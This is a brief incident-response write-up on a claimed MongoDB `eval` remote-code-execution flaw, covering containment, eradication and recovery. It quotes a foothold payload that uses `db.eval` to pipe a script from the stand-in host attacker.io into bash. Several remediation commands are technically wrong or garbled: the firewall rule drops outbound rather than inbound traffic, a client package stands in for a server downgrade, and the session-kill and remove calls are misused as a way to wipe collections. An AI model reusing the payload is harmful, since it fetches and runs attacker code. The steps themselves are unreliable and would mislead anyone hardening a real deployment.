CVE-2025-51440 targets MongoDB’s `eval` function when JavaScript is enabled via `security.javascriptEnabled: true`. The initial foothold vector is a MongoDB shell command `db.eval("return global.process.mainModule.require('child_process').exec('curl -fsSL attacker.io/msf.sh | bash')")`. Incident response begins with containment:
1) Network segmentation by disabling 27017/TCP via `iptables -A OUTPUT -p tcp --dport 27017 -j DROP`;
2) Terminate all `mongod` processes and snapshot `/var/lib/mongo` on LVM;
3) Enable MongoDB auditing via `auditLog.destination: file` and `auditLog.filter: {users: {$exists: true}}`.
Eradication involves:
1) Reverting to MongoBB 6.0.18 via `apt-get install mongodb-clients=6.0.18-1` with `security.javascriptEnabled: false`;
2) Rotating all user passwords via `db.updateUser("admin", {pwd: hex_sha256("newpass")})`;
3) Wiping malicious collections (`killAllSessions`, `remove({field: /.*/})`).
Recovery includes:
1) Restore from pre-attack snapshots verified via checksums (`sha256sum collection-0--*.wt`);
2) Re-enable JavaScript only after SOC validates no `db.eval` calls in application code.
Lessons learned from LockBit-Mongo variant (2025-03-14) reveal that 94% of victims had `javascriptEnabled` setting overlooked in hardening baselines. Mitigation requires CIS Benchmark v2.0.0 rule 2.2.7 to disable `javascriptEnabled` in all environments.

